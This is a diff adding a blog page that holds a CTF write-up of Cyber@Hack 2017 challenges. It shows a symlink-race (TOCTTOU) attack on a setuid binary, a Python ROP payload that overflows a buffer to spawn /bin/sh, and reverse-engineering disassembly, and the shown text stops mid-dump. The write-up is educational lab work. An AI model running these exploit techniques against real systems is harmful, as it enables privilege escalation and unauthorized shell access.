@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>[Write-Up] Cyber@Hack</title>
+	
+	<meta name="description" content="Write-Up on the Cyber@Hack CTF.">
+	
+	<meta name="author" content="Quentin Meffre">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link href="/assets/css/syntax.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="//www.gravatar.com/avatar/?s=35" class="img-circle" />
+				quentin meffre
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="/assets/media/XAV_1860.JPG" class="img-circle" width="180" height="250" />
+	</a>
+	<h3 class="title">
+        <a href="/">quentin meffre</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Computer science student, passionate about Cyber Security.
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/https://www.linkedin.com/in/quentin-meffre/">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>[Write-Up] Cyber@Hack </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   September 
+	   26th,
+	   
+	   2017
+	 </span>
+	  <div class="article_body">
+	  <h1 id="surroundings">Surroundings</h1>
+<p>The <a href="https://www.cyberathack.com/">Cyber@Hack</a> is a french CTF “on site” who take place in differents french cities. The CTF lasted a whole night from the 22 september to the 23 september. The CTF is made of different categories like pwnable, reverse engineering, web, cryptographie, steganographie and forensic.</p>
+
+<p>I did it with a friend and we finished 14th!</p>
+
+<p><img src="/assets/media/cyberathack.png" alt="cyber@hack" /></p>
+
+<p>Together we’ve done 6 challenges. We were focused on exploit and reverse engineering challenges. This post will explain you how we’ve solved the different challenges. Below is the different challenges we solved:</p>
+
+<ol>
+  <li><a href="/write-up/2017/09/26/cyber@hack.html#1-tocttou">tocttou</a> (Exploit)</li>
+  <li><a href="/write-up/2017/09/26/cyber@hack.html#2-basicrop">basicrop</a> (Exploit)</li>
+  <li><a href="/write-up/2017/09/26/cyber@hack.html#3-alien-language">alien-language</a> (Reverse engineering/Cryptography)</li>
+  <li><a href="/write-up/2017/09/26/cyber@hack.html#4-botoxedstring">BotoxedString</a> (Reverse engineering)</li>
+  <li><a href="/write-up/2017/09/26/cyber@hack.html#5-robot-cop">Robot cOP</a> (Exploit)</li>
+</ol>
+
+<p>You can find all the binary/exploit present in this post on my <a href="https://github.com/meffre-q/ctf/tree/master/cyber%40hack_2k17">Github</a>.</p>
+
+<h1 id="1-tocttou">1. Tocttou</h1>
+<p>This challenge was solved by my friend. It’s a tocttou exploitation challenge. Tocttou means Time Of Check To Time Of Use, that bug occurs when a binary open a file, try to access it and if it can, read it contents but forgot to check if the file has changed between the access part and the read part.</p>
+
+<p>So we first begun by checking the binary.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file tocttou
+tocttou: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>f85ccc503bad6c160864d080481d6d9885d1dd65, not stripped
+
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lh</span> tocttou 
+<span class="nt">-rwsr-sr-x</span> 1 tocttou-solved tocttou 8.3K Sep 21 14:03 tocttou
+
+<span class="nv">$ </span>checksec <span class="nt">--file</span> tocttou
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		4	tocttou
+</code></pre></div></div>
+
+<p>We faced a basic binary without stripped, PIE or SSP. Then I try to start the binary to check how it works:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./tocttou
+USAGE : ./tocttou &lt;file to <span class="nb">read</span><span class="o">&gt;</span>
+
+<span class="nv">$ </span>./tocttou flag
+flag : you dont have enough permissions to <span class="nb">read </span>this file.
+</code></pre></div></div>
+
+<p>Hum… It would have been so easy! Lets begin the reverse engineering part! After a little look at the asm code, it seems that the important part is in the “can_be_read” function.</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">tocttou</span> 
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="p">.</span><span class="o">/</span><span class="n">tocttou</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+
+<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">disas</span> <span class="n">can_be_read</span> 
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">can_be_read</span><span class="o">:</span>
+   <span class="mh">0x0000000000400770</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">rbp</span>
+   <span class="mh">0x0000000000400771</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span>
+   <span class="mh">0x0000000000400774</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x10</span>
+   <span class="mh">0x0000000000400778</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span><span class="n">rdi</span>
+   <span class="mh">0x000000000040077c</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span><span class="mh">0x0</span>
+   <span class="mh">0x0000000000400781</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x40078a</span> <span class="o">&lt;</span><span class="n">can_be_read</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span>
+   <span class="mh">0x0000000000400783</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+   <span class="mh">0x0000000000400788</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0x4007ab</span> <span class="o">&lt;</span><span class="n">can_be_read</span><span class="o">+</span><span class="mi">59</span><span class="o">&gt;</span>
+   <span class="mh">0x000000000040078a</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="err">]</span>
+   <span class="mh">0x000000000040078e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">esi</span><span class="p">,</span><span class="mh">0x4</span>
+   <span class="mh">0x0000000000400793</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
+   <span class="mh">0x0000000000400796</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x4005d0</span> <span class="o">&lt;</span><span class="n">access</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+   <span class="mh">0x000000000040079b</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;:</span>	<span class="k">test</span>   <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
+   <span class="mh">0x000000000040079d</span> <span class="o">&lt;+</span><span class="mi">45</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x4007a6</span> <span class="o">&lt;</span><span class="n">can_be_read</span><span class="o">+</span><span class="mi">54</span><span class="o">&gt;</span>
+   <span class="mh">0x000000000040079f</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x1</span>
+   <span class="mh">0x00000000004007a4</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0x4007ab</span> <span class="o">&lt;</span><span class="n">can_be_read</span><span class="o">+</span><span class="mi">59</span><span class="o">&gt;</span>
+   <span class="mh">0x00000000004007a6</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+   <span class="mh">0x00000000004007ab</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;:</span>	<span class="k">leave</span>  
+   <span class="mh">0x00000000004007ac</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;:</span>	<span class="k">ret</span>    
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>The function call the access libc function and return 1 if the access has success or 0 if not. Here is the Tocttou bug. As I said previously, if we change the file after access checked success, we will be able to bypass the access function!</p>
+
+<p>To do it, we will begin by create a file in the tmp directory.This file will be used for the first symbolic link. My friend solved the challenge in python but I’m better in Bash so I will show you the Bash method. To solved the challenge, we will need 2 shell. The first one will do an infine look with 4 command. The two first will create a symlink with the previous created file and then deleted this link and the two next command will created a symlink between with the flag file and then deleted this symlink. The second shell will run the binary in an infinite loop with the symlink as argument. The goal is to set the symlink when access check the file and then change that symlink when the file will be read with the flag file. You can see below a little scheme about the attack:<img src="/assets/media/tocttou_schema.png" alt="tocttou scheme" /></p>
+
+<p>Now let’s try it! Below is the first shell view:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>touch /tmp/dagger/foo
+
+<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span>ln <span class="nt">-s</span> /tmp/dagger/foo /tmp/dagger/toc<span class="p">;</span> unlink /tmp/dagger/toc<span class="p">;</span> ln <span class="nt">-s</span> /challenges/tocttou/flag /tmp/dagger/toc<span class="p">;</span> unlink /tmp/dagger/toc<span class="p">;</span> <span class="k">done</span>
+
+</code></pre></div></div>
+
+<p>And now the second shell view:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do</span> ./tocttou/tocttou /tmp/dagger/toc|grep flag <span class="p">;</span><span class="k">done
+</span>flag<span class="o">{</span>tick_tock_touuuu<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Done.</p>
+
+<p>Well played to my friend!</p>
+
+<h1 id="2-basicrop">2. BasicROP</h1>
+<p>As it is sayed in the challenge name, this one is a very basic Return Oriented Programming. For thos who don’t know what is the ROP technique, I redirect you to one of my precedent <a href="http://quentinmeffre.fr/return-oriented-programming-1/">post</a>.</p>
+
+<p>I first begin by taking a look to the binary, the size, the protection, the type, etc…</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file basicrop 
+basicrop: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, not stripped
+
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lh</span> basicrop 
+<span class="nt">-rwxr-xr-x</span> 1 meffre_q meffre_q 1.1K Sep 21 17:43 basicrop
+
+<span class="nv">$ </span>checksec <span class="nt">--file</span> basicrop
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		0	basicrop
+
+<span class="nv">$ </span>nm basicrop 
+00000000004000c1 t breakme
+000000000060011c D __bss_start
+000000000060011c D _edata
+0000000000600120 D _end
+00000000004000fa t fuckit
+0000000000600114 d shell
+00000000004000b0 T _start
+</code></pre></div></div>
+
+<p>No special protection, the binary is statically compiled but it seems very small, only 1.1K and after checking the symbol, the binary seems to be developed directly in assembly language because of the little number of symbols.</p>
+
+<p>So I begun the reversing part but it was very fast because of the little size of the binary. The “_start” function call a function name “breakme”. This “breakme” function did two syscall, the first one is “read” and the second one is “write”. But there is an overflow at the “read” syscall because the binary try to read 280 bytes in a 256 bytes buffer. So we can overwrite RIP register at the 256th byte. A basic ROP should not be easy because of the binary size but I remember of 2 symbols I didn’t saw yet in the binary, the function “fuckit” and the data “shell”. Below is the disassembled code of fuckit:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">disas</span> <span class="n">fuckit</span> 
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">fuckit</span><span class="o">:</span>
+   <span class="mh">0x00000000004000fa</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="n">movabs</span> <span class="n">rdi</span><span class="p">,</span><span class="mh">0x600114</span>
+   <span class="mh">0x0000000000400104</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="mh">0x0</span>
+   <span class="mh">0x0000000000400106</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">rdi</span>
+   <span class="mh">0x0000000000400107</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">rsp</span>
+   <span class="mh">0x000000000040010a</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rdx</span><span class="p">,</span><span class="err">[</span><span class="n">rsi</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span>
+   <span class="mh">0x000000000040010e</span> <span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">rax</span>
+   <span class="mh">0x000000000040010f</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">rax</span>
+   <span class="mh">0x0000000000400110</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;:</span>	<span class="k">pop</span>    <span class="n">rax</span>
+   <span class="mh">0x0000000000400111</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">ret</span>    
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>First, this function move a value in RDI register. It seems to contain the “shell” address we’ve saw in the “nm” output. Lets display it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb ./basicrop <span class="nt">-q</span>
+Reading symbols from ./basicrop...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+
+gdb-peda<span class="nv">$ </span>br _start
+Breakpoint 1 at 0x4000b0
+
+gdb-peda<span class="nv">$ </span>r
+...
+Breakpoint 1, 0x00000000004000b0 <span class="k">in </span>_start <span class="o">()</span>
+
+gdb-peda<span class="nv">$ </span>x/s 0x600114
+0x600114:	<span class="s2">"/bin/sh"</span>
+</code></pre></div></div>
+
+<p>Nice, thanks to this string, we can easily execute a shell! So the “fuckit” function is very easy. It move the strings “/bin/sh” into the RDI register, then push 0x0 and RDI on the stack, then move RSP into RSI, then load the address of RSI+0x8 (so RSP+0x8) and then pop 3 times a value into RAX. Our goal will be to do an “execve” syscall with the good argument/syscall number. Our register will look like that:</p>
+
+<p>RAX = 0x3b (59)
+RDI = “/bin/sh”
+RSI = “/bin/sh”
+RDX = 0x0</p>
+
+<p>RDI/RSI/RDX are set to the good value but we have to set RAX. In the “fuckit” function we can see 3 “pop”. The first and the second one will pop the RDI value and 0x0, the two value pushed just before. But we can control the last one so we will add the value 0x3b (59) on the stack to poped it in RAX. Then we need to do the syscall. To do it we will jump into one of the two syscall instructions in the “breakme” function. I choose the first one.</p>
+
+<p>The exploit will look like that:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">fuckit_addr</span><span class="o">=</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004000fa</span><span class="p">)</span>	 <span class="c"># Fuckit function address</span>
+<span class="n">execve</span><span class="o">=</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">)</span>			            <span class="c"># Execve syscall number</span>
+<span class="n">syscall_addr</span><span class="o">=</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x00000000004000dd</span><span class="p">)</span>    <span class="c"># Syscall instruction address</span>
+<span class="n">padding</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">256</span>						               <span class="c"># Padding before overflow</span>
+
+<span class="k">print</span> <span class="n">padding</span><span class="o">+</span><span class="n">fuckit_addr</span><span class="o">+</span><span class="n">execve</span><span class="o">+</span><span class="n">syscall_addr</span>
+</code></pre></div></div>
+
+<p>And then we test it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="o">(</span>python /tmp/dagger/basicrop.py<span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./basicrop 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@<span class="p">;</span>�@id
+<span class="nv">uid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1308<span class="o">(</span>basic_rop-solved<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1307<span class="o">(</span>basic_rop<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1307<span class="o">(</span>basic_rop<span class="o">)</span>,1002<span class="o">(</span>tocttou<span class="o">)</span>,1305<span class="o">(</span>robot_cop<span class="o">)</span>,1306<span class="o">(</span>2befree<span class="o">)</span>,1311<span class="o">(</span>botoxedstring<span class="o">)</span>,1312<span class="o">(</span>fakemalware-killswitch<span class="o">)</span>,1334<span class="o">(</span>dagger<span class="o">)</span>
+<span class="nb">cat </span>flag
+flag<span class="o">{</span>r0ppin9_Y0ur_waY_t0_h3aveN<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Done.</p>
+<h1 id="3-alien-language">3. Alien-Language</h1>
+<p>This challenge was in the cryptographic category but, for me, it was mostly a reversing challenge than cryptographic. (Maybe there was an other method to solve it…)</p>
+
+<p>This challenge was made with an elf-64 binary. So we began by examining it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file alien 
+alien: ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>a87da1012726ca02b0c683891ff6b35620b32e42, not stripped
+
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lh</span> alien 
+<span class="nt">-rwxr-xr-x</span> 1 meffre_q meffre_q 8.4K Sep 21 21:05 alien
+
+<span class="nv">$ </span>nm alien 
+0000000000201048 B __bss_start
+0000000000201048 b completed.6973
+                 w __cxa_finalize@@GLIBC_2.2.5
+0000000000201038 D __data_start
+0000000000201038 W data_start
+0000000000000670 t deregister_tm_clones
+0000000000000700 t __do_global_dtors_aux
+0000000000200de8 t __do_global_dtors_aux_fini_array_entry
+0000000000201040 D __dso_handle
+0000000000200df0 d _DYNAMIC
+0000000000201048 D _edata
+0000000000201050 B _end
+0000000000000b04 T _fini
+0000000000000740 t frame_dummy
+0000000000200de0 t __frame_dummy_init_array_entry
+0000000000000cec r __FRAME_END__
+0000000000201000 d _GLOBAL_OFFSET_TABLE_
+                 w __gmon_start__
+0000000000000ba0 r __GNU_EH_FRAME_HDR
+00000000000005d0 T _init
+0000000000200de8 t __init_array_end
+0000000000200de0 t __init_array_start
+0000000000000b10 R _IO_stdin_used
+                 w _ITM_deregisterTMCloneTable
+                 w _ITM_registerTMCloneTable
+0000000000000b00 T __libc_csu_fini
+0000000000000a90 T __libc_csu_init
+                 U __libc_start_main@@GLIBC_2.2.5
+000000000000091f T main
+000000000000074a T my_open
+                 U <span class="nb">printf</span>@@GLIBC_2.2.5
+00000000000006b0 t register_tm_clones
+                 U __stack_chk_fail@@GLIBC_2.4
+0000000000000640 T _start
+                 U strlen@@GLIBC_2.2.5
+0000000000201048 D __TMC_END__
+                 U write@@GLIBC_2.2.5
+
+<span class="nv">$ </span>./alien 
+337778877772337778
+Relaunch with the solution <span class="k">in </span>argument.
+
+<span class="nv">$ </span>./alien toto 
+Too bad
+</code></pre></div></div>
+
+<p>Nothing very interesting, the “strings” command didn’t give use much more informations. So let’s begin the reverse engineering!</p>
+
+<p>The main function look like that:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">alien</span> 
+<span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="p">.</span><span class="o">/</span><span class="n">alien</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
+
+<span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">disas</span> <span class="n">main</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">main</span><span class="o">:</span>
+<span class="mh">0x000000000000091f</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">rbp</span>
+<span class="mh">0x0000000000000920</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span>
+<span class="mh">0x0000000000000923</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x10</span>
+<span class="mh">0x0000000000000927</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span><span class="n">edi</span>
+<span class="mh">0x000000000000092a</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span><span class="p">,</span><span class="n">rsi</span>
+<span class="mh">0x000000000000092e</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span><span class="mh">0x1</span>
+<span class="mh">0x0000000000000932</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x960</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;</span>
+<span class="mh">0x0000000000000934</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x13</span>
+<span class="mh">0x0000000000000939</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">rsi</span><span class="p">,</span><span class="err">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x202</span><span class="err">]</span>        <span class="err">#</span> <span class="mh">0xb42</span>
